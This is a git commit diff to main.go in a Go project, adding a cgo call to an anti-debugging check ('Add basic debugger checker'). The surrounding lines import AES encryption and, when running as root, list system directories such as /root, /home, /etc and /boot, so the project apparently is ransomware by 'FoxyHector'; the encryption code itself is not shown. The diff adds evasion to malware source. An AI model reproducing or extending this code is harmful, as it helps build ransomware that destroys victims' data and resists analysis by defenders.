3ef2e71e31630fc3f9758150ed4cf91f67a1f1be
Umut <140441119+xHector1337@users.noreply.github.com>
2024-11-23 11:06:23 +0300

    Add basic debugger checker

--- main.go
+++ main.go
@@ -1,5 +1,10 @@
 package main
 
+/*
+#include "antidebug.h"
+*/
+import "C"
+
 import (
 	"crypto/aes"
 	"crypto/cipher"
@@ -74,6 +79,7 @@ RRRRRRRR     RRRRRRR        GGGGGG   GGGG     OOOOOOOOO
                               -------> Made by FoxyHector
 `
 	fmt.Printf("\t%s\n", banner)
+	C.check()
 	if os.Geteuid() == 0 {
 		fmt.Println("[+] Running as root!")
 		directories := []string{"/var", "/root", "/home", "/usr", "/bin", "/etc", "/boot"}
